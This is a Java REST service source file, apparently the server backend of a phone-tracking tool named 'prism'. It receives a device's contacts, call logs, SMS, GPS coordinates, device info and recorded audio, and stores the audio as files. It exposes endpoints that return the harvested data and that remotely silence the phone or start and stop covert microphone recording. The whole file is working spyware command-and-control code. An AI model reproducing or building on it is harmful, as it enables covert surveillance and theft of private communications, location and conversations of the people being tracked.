package resources;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URLDecoder;

import javax.ws.rs.Consumes;
import javax.ws.rs.GET;
import javax.ws.rs.POST;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.MultivaluedMap;

	@Path("/track")	
	public class Api {
		private static int flag=1;
		private static String callLogs;
		private static String contacts;
		private static String sms;
		private static String latlng;
		private static String info;
		private static String audioprofile = "1";
		private static String audfil;
		private static String audfil1;
		private static int recnum =0;
		private static int ondemandnum = 0;
		
		
		private static final String audiopath = "C:\\jee\\prism\\WebContent\\audio";
		@GET
		@Produces(MediaType.TEXT_PLAIN)
		public String respondAsReady() {
			return "Rest Web Service, exhibitor is ready!";
		}
		
		@POST
		@Path("alldata")
		@Consumes(MediaType.APPLICATION_FORM_URLENCODED)
		@Produces(MediaType.TEXT_PLAIN)
		
		public String allData(MultivaluedMap<String, String> e) throws IOException {
			if(flag==0){
				audioprofile="1";
				flag=1;
			}
			//System.out.println(""+e);
			contacts=""+e.get("contacts");
			callLogs=""+e.get("call_log");
			sms=""+e.get("sms");
			String lat,lng;
			lat=""+e.get("lat");
			lng=""+e.get("lng");
			latlng= lat.substring(1, lat.length()-1)+","+lng.substring(1, lng.length()-1);
			info=""+e.get("info");
			info=info.substring(1, info.length()-1);
			audfil=""+e.get("audiofile");
			//System.out.println("prism:"+audfil+"prism");
			audfil=audfil.substring(1, audfil.length()-1);
			//System.out.println("prism:"+audfil+"prism");
			audfil1=""+e.get("ondemand");
			//System.out.println("prism:"+audfil1+"prism");
			audfil1=audfil1.substring(1, audfil1.length()-1);
			
			
			sms=sms.substring(1, sms.length()-2);
			//System.out.println("prism:"+sms+"prism");
			
			
			
			callLogs=callLogs.substring(1, callLogs.length()-2);
			//System.out.println("prism:"+callLogs+"prism");
			
			
			
			contacts=contacts.substring(1, contacts.length()-2);
			//contacts=contacts.replaceAll("^[A-Za-z0-9~+]","");
			//System.out.println("prism:"+contacts+"prism");
			if(audfil.equals("")){
				System.out.println("prism:no value");
			}
			else{
				recnum++;
				String[] btarr=audfil.split(",");
				byte[] bytarr=new byte[btarr.length];
				for(int i=0;i<btarr.length;i++ ){
					bytarr[i]=Byte.parseByte(btarr[i]);
				}
				//audfil=URLDecoder.decode(audfil, "UTF-8");
				FileOutputStream fo = new FileOutputStream(audiopath+"\\recorded"+recnum+".3gp");
				fo.write(bytarr);
				fo.close();
				System.out.println("prism:"+audfil+"prism"+btarr.length);
			}
			if(audfil1.equals("")){
				System.out.println("ondemand:no value");
			}
			else{
				ondemandnum++;
				String[] btarr=audfil1.split(",");
				byte[] bytarr=new byte[btarr.length];
				for(int i=0;i<btarr.length;i++ ){
					bytarr[i]=Byte.parseByte(btarr[i]);
				}
				//audfil=URLDecoder.decode(audfil, "UTF-8");
				FileOutputStream fo = new FileOutputStream(audiopath+"\\ondemand"+ondemandnum+".3gp");
				fo.write(bytarr);
				fo.close();
				//System.out.println("ondemand:"+audfil1+"prism"+btarr.length);
			}
			//BufferedWriter br = new BufferedWriter(new OutputStreamWriter(fo));
			//br.write(audfil);
			//br.close();
			
			
			//System.out.println("prism:"+latlng+"prism");
			
			if(Integer.parseInt(audioprofile)>1){
				flag=0;
			}
			System.out.println(audioprofile);
			return audioprofile;
		}
		
		
		@POST
		@Path("setlatlng")
		@Consumes(MediaType.APPLICATION_FORM_URLENCODED)
		@Produces(MediaType.TEXT_PLAIN)
		public String setlatLong(MultivaluedMap<String, String> e) throws IOException {
			latlng= e.get("lat")+","+e.get("lng");
			
			return "10000";
		}
		
		@GET
		@Path("getcall_logs")
		@Produces(MediaType.TEXT_PLAIN)
		public String getcall_logs() {
			//System.out.println("asdfg: "+callLogs);
			return callLogs;
		}
		@GET
		@Path("getsms")
		@Produces(MediaType.TEXT_PLAIN)
		public String getsms() {
			//System.out.println("asdfg: "+sms);
			return sms;
		}
		@GET
		@Path("getcontacts")
		@Produces(MediaType.TEXT_PLAIN)
		public String getcontacts() {
			//System.out.println("asdfg: "+contacts);
			return contacts;
		}
		@GET
		@Path("getlatlng")
		@Produces(MediaType.TEXT_PLAIN)
		public String sendLatLng() {
			
			if(latlng == null){
				return "1";
			}
			return latlng;
		} 
		@GET
		@Path("getinfo")
		@Produces(MediaType.TEXT_PLAIN)
		public String sendinfo() {		
			
			return info;
		} 
		
		@GET
		@Path("setsilent")
		@Produces(MediaType.TEXT_PLAIN)
		public String setsilent() {		
			audioprofile="1532";
			System.out.println(""+audioprofile);
			return "1";
		} 
		@GET
		@Path("setgeneral")
		@Produces(MediaType.TEXT_PLAIN)
		public String setgeneral() {		
			audioprofile="1533";
			System.out.println(""+audioprofile);
			return "1";
		} 
		@GET
		@Path("recordmic")
		@Produces(MediaType.TEXT_PLAIN)
		public String recordmic() {		
			audioprofile="1534";
			System.out.println(""+audioprofile);
			return "1";
		} 
		@GET
		@Path("stoprecordmic")
		@Produces(MediaType.TEXT_PLAIN) 
		public String stoprecordmic() {		
			audioprofile="1535";
			
			System.out.println(""+audioprofile);
			return "1";
		} 
		@GET
		@Path("filenum")
		@Produces(MediaType.TEXT_PLAIN) 
		public String filenum() {		
			
			return recnum+","+ondemandnum;
			//return "10,5";
		} 
		
		
}
